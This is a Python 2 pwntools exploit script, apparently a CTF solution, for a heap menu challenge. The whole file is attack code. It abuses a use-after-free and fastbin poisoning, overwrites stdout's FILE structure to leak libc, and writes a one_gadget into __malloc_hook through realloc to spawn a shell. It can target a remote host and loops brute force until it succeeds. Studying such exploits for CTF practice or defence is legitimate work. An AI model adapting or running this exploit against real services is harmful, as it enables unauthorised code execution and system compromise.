#!/usr/bin/python2
# -*- coding:utf-8 -*-
from pwn import *
import sys
import platform

'''
	待修改数据
'''
context.log_level = 'debug'
context.arch = 'amd64'				# 32位使用i386
context.os = 'linux'

execve_file = './pwn'
lib_file = './libc.so.6'
argv = []




'''
	elf.plt[`symbol`] 获取elf文件中导入符号的plt地址
	elf.got[`symbol`] 获取elf文件中导入符号的got地址
	elf.sym['symbol'] 获取elf文件中本地符号的函数实际地址
'''
if execve_file != None:
	elf = ELF(execve_file)

'''
	lib.sym[`symbol`] 获取lib中符号地址
	lib.search['string'].next() 获取lib中字符串地址
'''
if lib_file != None:
	lib = ELF(lib_file)

log.info('-----------------------------------------------------------')


'''
	执行爆破攻击
	只有当成功获取shell或者键盘Ctrl+C退出时，程序中止循环
	否则程序一直进行循环
'''


def wp_add(r, idx, size):
	r.sendlineafter('>>', '1')
	r.sendlineafter('input index:', str(idx))
	r.sendlineafter('input size:', str(size))

def wp_delete(r, idx):
	r.sendlineafter('>>', '2')
	r.sendlineafter('input index:', str(idx))


def wp_edit(r, idx, context):
	r.sendlineafter('>>', '3')
	r.sendlineafter('input index:', str(idx))
	r.sendlineafter('input context:', context)

def wp_show(r):
	r.sendlineafter('>>', '666')

def exp():
	if 'd' in sys.argv:
		#r = gdb.debug([execve_file] + argv)	# 首先加载当前目录下的动态库文件
		r = process([execve_file] + argv)	# 首先加载当前目录下的动态库文件
	else:
		r = remote(sys.argv[1], sys.argv[2])

	wp_add(r, 0, 0xd0)		#base
	wp_add(r, 2, 0x10)		#base
	wp_delete(r, 0)

	wp_add(r, 1, 0x60)		#base
	wp_add(r, 2, 0x60)		#base + 0x70
	wp_add(r, 3, 0x60)		#base + 0x70 * 2

	wp_delete(r, 2)
	wp_delete(r, 3)
	wp_edit(r, 3, '\x00')
	wp_edit(r, 1, '\xdd\x25')
	wp_add(r, 4, 0x60)
	wp_add(r, 3, 0x60)
	wp_add(r, 2, 0x60)

	wp_edit(r, 2, '\x00' * 51 + p64(0xfbad1800) + p64(0) * 3 + '\x88')
	lib_base = u64(r.recvuntil('\x7f')[-6:].ljust(8, '\x00')) + 0x7ffff7a0d000 - 0x7ffff7dd18e0
	log.info('lib_base => %#x'%(lib_base))


	wp_delete(r, 3)
	wp_edit(r, 3, p64(lib_base + lib.sym['__malloc_hook'] - 0x23))

	wp_add(r, 3, 0x60)
	wp_add(r, 3, 0x60)

	wp_edit(r, 3, '\x00' * 0xb + p64(lib_base + 0x4527a) + p64(lib_base + lib.sym['realloc'] + 8))
	wp_add(r, 3, 0x60)
	r.interactive()

while True:
	try:
		exp()
		break
	except KeyboardInterrupt:
		break
	except:
		continue

	
log.info('-----------------------------------------------------------')
